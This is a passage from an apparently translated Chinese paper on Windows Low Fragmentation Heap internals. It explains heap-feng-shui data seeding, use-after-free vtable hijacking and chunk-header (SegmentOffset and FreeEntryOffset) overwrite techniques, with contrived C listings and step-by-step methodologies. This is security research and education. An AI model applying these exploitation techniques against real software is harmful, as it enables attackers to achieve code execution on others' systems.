2010)来对一个真实的覆盖null终止符案例一探究竟，该利用最后达成了代码执行。</p><p>&emsp;&emsp;但是如果alloc2被使用到了或者在alloc3使用前对其头部(alloc2)进行了验证该如何？因此你需要找到那个恰好在被溢出Chunk(alloc3)正前方的Chunk(alloc2)。尽管这可能看起来很简单，但在控制分配和释放时还需要考虑碎片问题。</p><p style="text-align:center;font-weight:bold">Listing 44. Chunk reuse</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">alloc1 = HeapAlloc(pHeap, <span class="number">0x0</span>, SIZE);</span><br><span class="line">alloc2 = HeapAlloc(pHeap, <span class="number">0x0</span>, SIZE);</span><br><span class="line">alloc3 = HeapAlloc(pHeap, <span class="number">0x0</span>, SIZE);</span><br><span class="line"></span><br><span class="line">HeapFree(pHeap, <span class="number">0x0</span>, alloc2);</span><br><span class="line"></span><br><span class="line"><span class="comment">//overflow‐able chunk just like alloc1 could reside in same position as alloc2</span></span><br><span class="line"><span class="comment">//像alloc1那样的可溢出块同样可以驻留在与alloc2相同的位置上</span></span><br><span class="line">alloc4 = HeapAlloc(pHeap, <span class="number">0x0</span>, SIZE);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(alloc4, src, user_controlled_size);</span><br></pre></td></tr></table></figure><blockquote><p>注意：尽管精心操纵堆使得Chunk按序相邻在LFH中更简单一些，但却有个重大缺陷。想要布置两个不同大小的Chunks变得更为复杂(涉及了相邻内存上的多个SubSegments)。如果想要控制不同大小的Chunk来达成漏洞利用，那么这无疑是最大的绊脚石。</p></blockquote><h4 id="Seeding-Data-播种数据"><a href="#Seeding-Data-播种数据" class="headerlink" title="Seeding Data(播种数据)"></a>Seeding Data(播种数据)</h4><p>&emsp;&emsp;撰写此文之际，UAF漏洞非常流行。这些漏洞的大多数漏洞利用都包含了各种各样的分配方法(JavaScript strings, DOM对象实例等等)，以尝试在堆中播种数据。由于缺乏对对象数据的理解，Nico Waisman称这种技术为pray-after-free(Waisman 2010)。</p><p>&emsp;&emsp;我们已经知道LFH如何将内存存储在大的UserBlock中，这些UserBlock分为BucketSize块。我们也知道了UserBlock中这些Chunks是可以相互毗邻的，这依赖于分配和释放行为的控制。基于此，我们可以通过将数据写入用户可写的内存来控制每个Chunk的内容(这因HEAP_ZERO_MEMORY标志是否设置这一情况而异，该标志的设置是在对HeapAlloc()的调用中)。</p><p>&emsp;&emsp;下面的实例展示了内存如何被拷贝到LFH中的Chunks上，随后进行释放，然后再分配时又不会丢失很多原始数据。</p><p style="text-align:center;font-weight:bold">Listing 45. Data seeding</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">EnableLFH(SIZE);</span><br><span class="line">NormalizeLFH(SIZE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//分配堆块并初始化</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Allocation 0x%02x for 0x%02x bytes =&gt; "</span>, i, SIZE);</span><br><span class="line">    allocb[i] = HeapAlloc(pHeap, <span class="number">0x0</span>, SIZE);</span><br><span class="line">    <span class="built_in">memset</span>(allocb[i], <span class="number">0x41</span> + i, SIZE);</span><br><span class="line">    <span class="comment">//打印内容</span></span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">12</span>; j++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%.2X"</span>, allocb[i][j]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//释放所有堆块</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Freeing all chunks!\n"</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    HeapFree(pHeap, <span class="number">0x0</span>, allocb[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//再次分配</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Allocating again\n"</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//再次分配，但不初始化</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Allocation 0x%02x for 0x%02x bytes =&gt; "</span>, i, SIZE);</span><br><span class="line">    allocb[i] = HeapAlloc(pHeap, <span class="number">0x0</span>, SIZE);</span><br><span class="line">    <span class="comment">//打印内容</span></span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">12</span>; j++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%.2X"</span>, allocb[i][j]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p style="text-align:center;font-weight:bold">Listing 46. Data seeding results</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Result:</span><br><span class="line">Allocation 0x00 for 0x28 bytes =&gt; 41414141 41414141 41414141</span><br><span class="line">Allocation 0x01 for 0x28 bytes =&gt; 42424242 42424242 42424242</span><br><span class="line">Allocation 0x02 for 0x28 bytes =&gt; 43434343 43434343 43434343</span><br><span class="line">Allocation 0x03 for 0x28 bytes =&gt; 44444444 44444444 44444444</span><br><span class="line">Allocation 0x04 for 0x28 bytes =&gt; 45454545 45454545 45454545</span><br><span class="line">Allocation 0x05 for 0x28 bytes =&gt; 46464646 46464646 46464646</span><br><span class="line">Allocation 0x06 for 0x28 bytes =&gt; 47474747 47474747 47474747</span><br><span class="line">Allocation 0x07 for 0x28 bytes =&gt; 48484848 48484848 48484848</span><br><span class="line">Allocation 0x08 for 0x28 bytes =&gt; 49494949 49494949 49494949</span><br><span class="line">Allocation 0x09 for 0x28 bytes =&gt; 4A4A4A4A 4A4A4A4A 4A4A4A4A</span><br><span class="line">Allocation 0x0a for 0x28 bytes =&gt; 4B4B4B4B 4B4B4B4B 4B4B4B4B</span><br><span class="line">Allocation 0x0b for 0x28 bytes =&gt; 4C4C4C4C 4C4C4C4C 4C4C4C4C</span><br><span class="line">Allocation 0x0c for 0x28 bytes =&gt; 4D4D4D4D 4D4D4D4D 4D4D4D4D</span><br><span class="line">Allocation 0x0d for 0x28 bytes =&gt; 4E4E4E4E 4E4E4E4E 4E4E4E4E</span><br><span class="line">Allocation 0x0e for 0x28 bytes =&gt; 4F4F4F4F 4F4F4F4F 4F4F4F4F</span><br><span class="line">Allocation 0x0f for 0x28 bytes =&gt; 50505050 50505050 50505050</span><br><span class="line"></span><br><span class="line">Freeing all chunks!</span><br><span class="line">Allocating again</span><br><span class="line"></span><br><span class="line">Allocation 0x00 for 0x28 bytes =&gt; 56005050 50505050 50505050</span><br><span class="line">Allocation 0x01 for 0x28 bytes =&gt; 50004F4F 4F4F4F4F 4F4F4F4F</span><br><span class="line">Allocation 0x02 for 0x28 bytes =&gt; 4A004E4E 4E4E4E4E 4E4E4E4E</span><br><span class="line">Allocation 0x03 for 0x28 bytes =&gt; 44004D4D 4D4D4D4D 4D4D4D4D</span><br><span class="line">Allocation 0x04 for 0x28 bytes =&gt; 3E004C4C 4C4C4C4C 4C4C4C4C</span><br><span class="line">Allocation 0x05 for 0x28 bytes =&gt; 38004B4B 4B4B4B4B 4B4B4B4B</span><br><span class="line">Allocation 0x06 for 0x28 bytes =&gt; 32004A4A 4A4A4A4A 4A4A4A4A</span><br><span class="line">Allocation 0x07 for 0x28 bytes =&gt; 2C004949 49494949 49494949</span><br><span class="line">Allocation 0x08 for 0x28 bytes =&gt; 26004848 48484848 48484848</span><br><span class="line">Allocation 0x09 for 0x28 bytes =&gt; 20004747 47474747 47474747</span><br><span class="line">Allocation 0x0a for 0x28 bytes =&gt; 1A004646 46464646 46464646</span><br><span class="line">Allocation 0x0b for 0x28 bytes =&gt; 14004545 45454545 45454545</span><br><span class="line">Allocation 0x0c for 0x28 bytes =&gt; 0E004444 44444444 44444444</span><br><span class="line">Allocation 0x0d for 0x28 bytes =&gt; 08004343 43434343 43434343</span><br><span class="line">Allocation 0x0e for 0x28 bytes =&gt; 02004242 42424242 42424242</span><br><span class="line">Allocation 0x0f for 0x28 bytes =&gt; 62004141 41414141 41414141</span><br></pre></td></tr></table></figure><blockquote><p>注意：如果一个HeapBin中所有的Chunks都被释放了，那么整个Bin自身也会被释放。这意味着它不可能像Lookaside链表那样具有完全的活塞效应。Jay-Z建议在进行多此释放之前，先分配大量的Chunks，最小化HeapBin因太小而会被释放这一情形的概率。</p></blockquote><p>&emsp;&emsp;首次分配打印出了向LFH每个Chunk写入的内存数据，大小是0x28(增加_HEAP_ENTRY头大小后是0x30)。所有的Chunks都被释放掉，然后以与步骤1中相同的分配方式进行分配。尽管这一次我们没有看到对memset的调用，但是Chunks中的数据却是惊人的相似。</p><p>&emsp;&emsp;这是因为这些Chunks既没有被合并也没有被清除数据。被改变的仅仅只有数据域的前两个字节。这就是在算法(Algorithms)一节中谈到的保存的FreeEntryOffset。FreeEntryOffset被保存在Chunk Header之后的内存的前两个字节中，以供堆管理器将来使用。</p><p>&emsp;&emsp;还应当注意重新分配的Chunks相对于一开始在UserBlock中原本的顺序来说是颠倒的。这不是因为内存自身做了翻转，而是因为FreeEntryOffset在每次HeapFree()调用时都会重新建立索引。因此在知晓分配大小和旧数据的情况下我们可以做什么呢？对于已知大小分配能力的利用，UAF是一个非常完美的候选者。</p><p>&emsp;&emsp;让我们假定某个对象的大小为0x30字节，并且在0x0偏移处有个虚表。该对象在被释放，并进行垃圾回收后，然后被错误的使用到。这就给了我们在释放后再次使用之前可以覆写其数据域的机会，攻击者就可以控制(或半控制)虚表所在的地址。</p><p>&emsp;&emsp;由于大小是已知的，通过控制在此释放的对象被使用之前进行一次分配操作，这就给了我们完全的控制权去决定对象的虚表应该使用哪个地址。控制该地址可以让我们有能力改变程序执行流到我们提供的地址上，而这里往往是我们的payload。</p><p style="text-align:center;font-weight:bold">Listing 47. Use-after-free contrived example (Sotoriv 2007)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//LFH is enabled</span></span><br><span class="line"><span class="comment">//LFH已经被启用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//0x30 byte object</span></span><br><span class="line">var obj = <span class="keyword">new</span> FakeObj();</span><br><span class="line"></span><br><span class="line"><span class="comment">//.</span></span><br><span class="line"><span class="comment">//.</span></span><br><span class="line"><span class="comment">//.</span></span><br><span class="line"><span class="comment">//obj goes out of scope &amp; garbage collected</span></span><br><span class="line"><span class="comment">//.</span></span><br><span class="line"><span class="comment">//.</span></span><br><span class="line"><span class="comment">//.</span></span><br><span class="line"></span><br><span class="line">var heap = <span class="keyword">new</span> heapLib.ie();</span><br><span class="line"></span><br><span class="line"><span class="comment">//this will allocate the same location in memeory as obj</span></span><br><span class="line"><span class="comment">//这将在内存中分配到与obj相同位置的堆块</span></span><br><span class="line">heap.alloc(<span class="string">"A"</span> * <span class="number">0x30</span>, <span class="string">"overwrite"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//vtable == 0x41414141</span></span><br><span class="line"><span class="comment">//假的虚表指针</span></span><br><span class="line">obj.DoStuff();</span><br></pre></td></tr></table></figure><blockquote><p>注意：尽管这是一个过于简单的例子，但它仍然展示了使用堆管理如何产生精准的漏洞利用的知识。如果你在Blackhat USA 2010前阅读本文，我强烈建议你参加Nico Waisman的演讲，Aleatory Persistent Threat。如果没有的话请花些时间阅读他的同名的论文，它会提供本文讨论的主题的应用实例。</p></blockquote><h3 id="Exploitation-漏洞利用"><a href="#Exploitation-漏洞利用" class="headerlink" title="Exploitation(漏洞利用)"></a>Exploitation(漏洞利用)</h3><p>&emsp;&emsp;自从堆利用变得流行之后，若干保护机制相继诞生，从Safe-Unlinking到编码Chunk头，堆利用的难度继续增加。当下的元数据损坏通常用来覆写部署在堆上的应用程序数据，而不是直接达成代码执行。话虽如此，但这不应被认为是不可能的；尽管很困难，元数据损坏仍可用于获得代码执行。</p><p>&emsp;&emsp;在本节中我会将堆元数据利用相关的新旧技术一起讨论。尽管这种元数据损坏不能获得简单的write-4，但它会展示在满足一定的前提条件下，如何通过操纵数据来达成代码执行。</p><h4 id="Ben-Hawkes-1"><a href="#Ben-Hawkes-1" class="headerlink" title="Ben Hawkes #1"></a>Ben Hawkes #1</h4><p>&emsp;&emsp;Ben Hawkes的RuxCon 2008论文(Hawkes 2008)不仅仅对Windows Vista内存管理给出了一个概览，还对通过堆损坏达成代码执行的新技术进行了阐述。我建议读者在阅读本论文、尤其是本节内容前，优先阅读他的文章。他引入了若干技巧，印象最深的就是他的Heap HANDLE payload，但在本文中我只讨论一种技术。</p><p>&emsp;&emsp;Dr.Hawkes还特别的谈到了由LFH管理的UserBlock中的Chunks损坏。当在RtlpLowFragHeapFree()中释放Chunk时，它会检查_HEAP_ENTRY的UnusedBytes(offset 0x7)的值是否是0x5(感觉这里应该是ExtendedBlockSignature)。如果是的话函数会使用SegmentOffset (offset 0x6)作为一个不同的Chunk头部的索引。</p><p style="text-align:center;font-weight:bold">Listing 48. Chunk header relocation</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_HEAP_ENTRY *ChunkHeader = ChunkToFree ‐ <span class="keyword">sizeof</span>(_HEAP_ENTRY);</span><br><span class="line"><span class="keyword">if</span>(ChunkHeader‐&gt;UnusedBytes == <span class="number">0x5</span>)</span><br><span class="line">    ChunkHeader ‐= <span class="number">8</span> * (BYTE)ChunkHeader‐&gt;SegmentOffset;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;LFH上的普通Chunk将具有一个类似于以下内容的头部：</p><p><img src="/resources/2021/Understanding_the_Low_Fragmentation_Heap/HeapBin_chunk.png" alt="HeapBin chunk"></p><p style="text-align:center;font-weight:bold">Diagram 14. HeapBin chunk</p><blockquote><p>注意：NextOffset实际上不是一个独立的字段，它只是数据域的前两个字节。</p></blockquote><p>&emsp;&emsp;如果你可以布置一个可溢出Chunk在待释放Chunk的正前方，那么UnusedBytes就可以被赋值成0x5，SegmentOffset可以覆写成你所选择的1字节值，这意味着Header位置可以向前0x0 <em> 8到0xFF </em> 8字节。</p><p><img src="/resources/2021/Understanding_the_Low_Fragmentation_Heap/Overwritten_HeapBin_chunk.png" alt="Overwritten HeapBin chunk"></p><p style="text-align:center;font-weight:bold">Diagram 15. Overwritten HeapBin chunk</p><p>&emsp;&emsp;ChunkHeader基于被覆写的SegmentOffset而重新定位，但其_HEAP_ENTRY必须得合法，因为RtlpLowFragHeapFree()必须得把它释放掉。一眼望去好像没什么卵用，让我们看看下面的代码实例。</p><p>&emsp;&emsp;一个高度简单，人为设计的示例(忽略作用域)。它从源获取输入并尝试创建对象和分配内存以供将来使用。由于对要读取的内存量的计算错误，会出现一个缓冲区溢出。我将向您展示这种溢出是如何导致覆盖应用程序数据。</p><p style="text-align:center;font-weight:bold">Listing 49. C++ contrived example</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Paser</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Parser();</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">DoThings</span><span class="params">()</span></span>;</span><br><span class="line">    ~Parser();</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> Items;</span><br><span class="line">    <span class="keyword">int</span> Values;</span><br><span class="line">    <span class="keyword">int</span> Stuff;</span><br><span class="line">    <span class="keyword">int</span> Things;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *buffer, *output;</span><br><span class="line"><span class="keyword">int</span> action, copy_size = <span class="number">0x40</span>;</span><br><span class="line">Parser *p;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    action = ReadInt();</span><br><span class="line">    <span class="keyword">if</span>(action == <span class="number">0x1</span>)</span><br><span class="line">        p = <span class="keyword">new</span> Parser();</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(action == <span class="number">0x2</span>)</span><br><span class="line">        buffer = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Parser));</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(action == <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    action = ReadInt();</span><br><span class="line">    <span class="keyword">if</span>(action == <span class="number">0x3</span>)</span><br><span class="line">        p.DoThings();</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(action == <span class="number">0x4</span>)</span><br><span class="line">        ReadBytes(buffer, copy_size);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(action == <span class="number">0x5</span>)</span><br><span class="line">        <span class="built_in">free</span>(buffer);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(action == <span class="number">0x6</span>)</span><br><span class="line">        <span class="keyword">delete</span> p;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(action == <span class="number">0x7</span>)</span><br><span class="line">        ReadBytes(buffer, <span class="number">0x10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;第一件事就是为sizeof(Parser)激活LFH，然后设置内存以便于Parser对象被布置在可以溢出的对象的后面。还需要进行另一次分配，这样溢出的Chunk头部就不会在分配后在RtlpLowFragHeapAllocFromContext()中被重新赋值。这将允许使用用户可控值覆盖相邻的Chunk头。</p><p><img src="/resources/2021/Understanding_the_Low_Fragmentation_Heap/Chunk_setup.png" alt="Chunk setup"></p><p style="text-align:center;font-weight:bold">Diagram 16. Chunk setup</p><p>&emsp;&emsp;在覆盖了Alloc2的头部之后，它会调整Chunk头指向parser对象，我们此后释放Alloc2，这就会使得parser对象所在的内存位置变成了下一个可用Chunk。</p><p><img src="/resources/2021/Understanding_the_Low_Fragmentation_Heap/Chunk_overwrite_and_free.png" alt="Chunk overwrite and free"></p><p style="text-align:center;font-weight:bold">Diagram 17. Chunk overwrite and free</p><p>&emsp;&emsp;现在我们再次分配时，就会得到parser对象的地址，该地址在覆盖vtable之后将在我们的控制之下。因此，通过这第三次的分配加上对p.DoThings()的调用就可以为所欲为。</p><h5 id="Step-by-Step-步步为营"><a href="#Step-by-Step-步步为营" class="headerlink" title="Step-by-Step(步步为营)"></a>Step-by-Step(步步为营)</h5><ol><li>为sizeof(Parser)激活LFH</li><li>分配一个Parser对象</li><li>分配第一个内存Chunk，它可以溢出(Alloc1)</li><li>分配第二个内存Chunk，用于被溢出覆写头部(Alloc2)</li><li>溢出Alloc1，覆盖Alloc2的头部，UnusedBytes改为0x5，SegOffset改为指向parser对象所需要的blocks的数量</li><li>释放Alloc2</li><li>分配第三个内存Chunk，写入你期望的数据。于是，我们可以覆写parser对象的虚表指针(Alloc3)</li><li>触发对parser对象虚函数的调用(这里以p.DoThings()为例)</li></ol><h5 id="Prerequisites-前提条件"><a href="#Prerequisites-前提条件" class="headerlink" title="Prerequisites(前提条件)"></a>Prerequisites(前提条件)</h5><ul><li>可以控制特定大小的分配</li><li>有能力为特定大小的Bucket激活LFH</li><li>在被溢出的Chunk前放置一个合法的Chunk</li><li>至少溢出8字节，从而可以改变相邻内存Chunk的头</li><li>可以释放被覆写的Chunk的能力</li></ul><h5 id="Methodology-方法论"><a href="#Methodology-方法论" class="headerlink" title="Methodology(方法论)"></a>Methodology(方法论)</h5><ol><li>激活LFH</li><li>标准化堆</li><li>Alloc1</li><li>Alloc2</li><li>Alloc3</li><li>覆写Alloc3(至少8字节)</li><li>释放Alloc3(调整头部指向Alloc1)</li><li>Alloc4(实际上指向Alloc1)</li><li>写入数据(污染Alloc1的数据)</li><li>使用Alloc1</li></ol><h4 id="FreeEntryOffset-Overwrite-覆写FreeEntryOffset"><a href="#FreeEntryOffset-Overwrite-覆写FreeEntryOffset" class="headerlink" title="FreeEntryOffset Overwrite(覆写FreeEntryOffset)"></a>FreeEntryOffset Overwrite(覆写FreeEntryOffset)</h4><p>&emsp;&emsp;本节以一个新技术开始，该技术是我在撰写本论文时调研所得。在前一节中，我们讨论了如何通过跟踪当前Offset和下一个可用块的Offset来管理UserBlock中的块。当前的Offset保存在_INTERLOCK_SEQ结构体中。这样，LFH就知道从何处获取下一个空闲Chunk。</p><p>&emsp;&emsp;这样做的主要问题在于下一个FreeEntryOffset存储于Chunk数据域的前两个字节。这意味着分配器必须算出一个值，该值与被管理的Chunk的大小相关，随后被存储到数据域用于下一次迭代。既然LFH中每个Chunk相互之间都是挨着的，并且Chunk头部在分配时不会做校验，那么FreeEntryOffset就可以被覆写成一个新的Offset，这使得后续的分配会指向半任意(semi-arbitrary)位置。</p><p style="text-align:center;font-weight:bold">Listing 50. Try/Catch for LFH allocation</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">//the next offset is stored in the 1st 2‐bytes of userdata</span></span><br><span class="line">    <span class="comment">//下一个偏移量存储在userdata的前2个字节中</span></span><br><span class="line">    <span class="keyword">short</span> NextOffset = UserBlocks + BlockOffset + <span class="keyword">sizeof</span>(_HEAP_ENTRY);</span><br><span class="line"></span><br><span class="line">    _INTERLOCK_SEQ AggrExchg_New;</span><br><span class="line">    AggrExchg_New.Offset = NextOffset;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;有了此知识，通过至少0x9(0xA更好)字节的覆写，我们可以影响到NextOffset的值，从而影响下一次分配。让我们看一个示例。</p><p style="text-align:center;font-weight:bold">Listing 51. FreeEntryOffset ovewrite example</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dollar</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        Dollar();</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">INeedDollar</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="keyword">int</span> Job = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> Dollars = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> Booze = <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> first_len, second_len, total_len;</span><br><span class="line"><span class="keyword">char</span> *dollar1, *dollar2, *dollar3, *data1, *data2;</span><br><span class="line"><span class="keyword">char</span> *statement = <span class="string">"I need dollar"</span>;</span><br><span class="line"></span><br><span class="line">first_len = ReadInt();</span><br><span class="line">second_len = ReadInt();</span><br><span class="line"></span><br><span class="line">data = alloc(first_len);</span><br><span class="line">ReadBytes(data, first_len);</span><br><span class="line"><span class="comment">//int wrap</span></span><br><span class="line">total_len = first_len + second_len;</span><br><span class="line"></span><br><span class="line"><span class="comment">//we can write more data than this allocation can hold</span></span><br><span class="line"><span class="comment">//我们可以写入比此分配的Chunk所能容纳的更多的数据</span></span><br><span class="line">dollar1 = alloc(total_len);</span><br><span class="line"><span class="built_in">memcpy</span>(dollar1, data, first_len);</span><br><span class="line"></span><br><span class="line"><span class="comment">//this will store the tainted FreeEntryOffset in the _INTERLOCK_SEQ</span></span><br><span class="line"><span class="comment">//这将在_INTERLOCK_SEQ结构中存储受污染的FreeEntryOffset</span></span><br><span class="line">dollar2 = alloc(total_len);</span><br><span class="line"><span class="built_in">memcpy</span>(dollar2, statement, <span class="built_in">strlen</span>(statement));</span><br><span class="line"></span><br><span class="line"><span class="comment">//although not on the same UserBlock, it will be allocated on an adjacent page in memory</span></span><br><span class="line"><span class="comment">//虽然不在同一个UserBlock上，但它将分配到内存中相邻的页面上</span></span><br><span class="line">Dollar dollars[<span class="number">0x20</span>];</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0x20</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    dollars[i] = <span class="keyword">new</span> Dollar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//this will give us 0xFFFF * 0x8 bytes of forward range when making an allocation, </span></span><br><span class="line"><span class="comment">//more than enough room to overwrite any of the Dollar objects</span></span><br><span class="line"><span 